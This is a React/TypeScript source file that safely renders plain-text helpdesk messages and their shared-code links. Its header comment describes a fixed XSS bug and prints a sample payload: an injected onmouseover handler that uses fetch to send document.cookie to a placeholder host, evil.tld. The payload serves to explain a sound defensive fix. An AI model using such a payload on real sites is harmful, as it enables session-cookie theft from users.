import React from 'react'

/**
 * Plain-text message bodies (`msg.body` with no `bodyHtml`) rendered as JSX.
 *
 * This used to be a `dangerouslySetInnerHTML` fed by a hand-rolled escaper that
 * replaced `&`, `<` and `>` but NOT the double quote, then re-injected the link
 * target into `href="$2"`. Since the URL pattern accepts every character but
 * whitespace and `)`, a body such as
 *
 *     [code:1](https://a"/onmouseover="fetch(`//evil.tld/?c=`+document.cookie))
 *
 * closed the `href` attribute and added a real event-handler attribute.
 * `msg.body` is attacker-controlled from OUTSIDE the tenant: the inbound-email
 * pipeline copies `pendingEmail.body` verbatim into a ticket message
 * (`endpoints/pending-emails-process.ts`), and `sanitizeMessageHtml` only ever
 * looks at `bodyHtml`.
 *
 * The fix is to stop building HTML: React escapes text nodes and attribute
 * values on its own, so no quoting mistake is possible. The URL is additionally
 * parsed and restricted to http/https before it reaches an `href`.
 *
 * Newlines need no `<br/>`: the wrapper carries `whitespace-pre-wrap`.
 */

/** `[code:12](https://…)` — the shared-code link marker posted by the agent console. */
const CODE_LINK_RE = /\[code:(\d+)\]\((https?:\/\/[^\s)]+)\)/g

/** Returns the URL only when it parses AND uses an http(s) scheme; null otherwise. */
export function safeHttpUrl(raw: string): string | null {
  try {
    const url = new URL(raw)
    if (url.protocol !== 'http:' && url.protocol !== 'https:') return null
    return url.toString()
  } catch {
    return null
  }
}

/**
 * Split a plain-text body into text nodes and `<a>` elements.
 * Exported (rather than inlined in the page) so the escaping contract is
 * unit-testable — the page itself imports `@payload-config` and cannot be
 * loaded from a test.
 */
export function renderPlainMessageBody(body: string): React.ReactNode[] {
  const nodes: React.ReactNode[] = []
  const re = new RegExp(CODE_LINK_RE.source, 'g')
  let lastIndex = 0
  let match: RegExpExecArray | null

  while ((match = re.exec(body)) !== null) {
    if (match.index > lastIndex) nodes.push(body.slice(lastIndex, match.index))

    const href = safeHttpUrl(match[2])
    if (href) {
      nodes.push(
        <a
          key={`code-${match.index}`}
          href={href}
          target="_blank"
          rel="noopener noreferrer"
          className="text-blue-600 underline font-semibold"
        >
          🔗 Voir le code partagé
        </a>,
      )
    } else {
      // Not a usable link — show the raw marker as text rather than dropping it.
      nodes.push(match[0])
    }

    lastIndex = match.index + match[0].length
  }

  if (lastIndex < body.length) nodes.push(body.slice(lastIndex))
  return nodes
}

export function PlainMessageBody({ body }: { body: string }) {
  return (
    <div className="whitespace-pre-wrap text-sm leading-relaxed">
      {renderPlainMessageBody(body ?? '').map((node, i) => (
        <React.Fragment key={i}>{node}</React.Fragment>
      ))}
    </div>
  )
}
